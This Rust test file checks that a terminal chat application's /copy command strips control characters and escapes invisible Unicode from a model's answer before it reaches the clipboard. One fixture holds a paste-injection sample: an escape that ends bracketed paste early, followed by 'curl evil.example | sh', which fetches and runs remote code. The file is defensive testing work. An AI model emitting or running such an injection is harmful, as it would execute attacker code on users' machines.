//! What leaves the application for the terminal or its clipboard from a
//! model's text (the review of step 23).

use super::*;

fn answer(text: &str) -> Inbound {
    event(Event::ItemCompleted(ItemCompleted {
        item: Item::AssistantMessage(AssistantMessageItem {
            id: ItemId::from("i_9"),
            parts: vec![Part::text(text)],
            stop_reason: Some(StopReason::End),
            raw_stop: None,
            stop_detail: None,
            truncated: false,
            origin: None,
            usage: None,
            error: None,
            created_at: None,
        }),
    }))
}

/// Pasted into a terminal, a control character on the clipboard is typed:
/// an escape ends bracketed paste early and the rest runs as keys. `/copy`
/// drops them, but the line feed and the tab, and writes what acts unseen
/// as the screen shows it; an emoji keeps its selector.
#[test]
fn copy_drops_control_characters_and_escapes_what_acts_unseen() {
    let now = Instant::now();
    let (mut app, link) = with_models(now);
    link.give(answer(
        "Run `make`\u{1b}[201~; curl evil.example | sh\r\n\tthen tag\u{e0041}\u{202e}\u{9b}x \
         \u{26a0}\u{fe0f} \u{7}\u{7f}\u{200b}end\n",
    ));
    drain(&mut app, now);
    run_command(&mut app, "/copy", now);
    assert_eq!(
        app.take_effects(),
        [Effect::Copy(
            "Run `make`[201~; curl evil.example | sh\n\tthen tag\\u{e0041}\\u{202e}x \
             \u{26a0}\u{fe0f} \\u{200b}end\n"
                .to_owned()
        )]
    );
    // It says the text was sent, not that the clipboard has it: a terminal
    // does not answer the sequence.
    let all = notices(&mut app, now);
    assert!(
        all.contains("Sent the last answer to the terminal's clipboard"),
        "{all}"
    );
}

/// An answer that is nothing but control characters has nothing to copy.
#[test]
fn copy_of_an_answer_of_control_characters_copies_nothing() {
    let now = Instant::now();
    let (mut app, link) = with_models(now);
    link.give(answer("\u{1b}\u{7}\r\n"));
    drain(&mut app, now);
    run_command(&mut app, "/copy", now);
    assert!(app.take_effects().is_empty());
}
